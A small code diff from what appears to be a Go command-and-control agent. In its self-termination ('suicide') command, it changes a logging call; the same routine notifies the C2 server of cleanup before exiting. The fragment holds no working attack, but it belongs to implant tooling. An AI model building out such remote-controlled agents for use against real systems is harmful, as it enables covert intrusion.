@@ -17,6 +17,6 @@ func suicideCmdRun(cmd *cobra.Command, args []string) {
 	}
 	// No AgentRoot to clean up anymore
 	c2transport.NotifyC2(cmd, "Cleanup successful, exiting")
-	logging.Println("Exiting...")
+	logging.Infof("Exiting...")
 	os.Exit(0)
 }
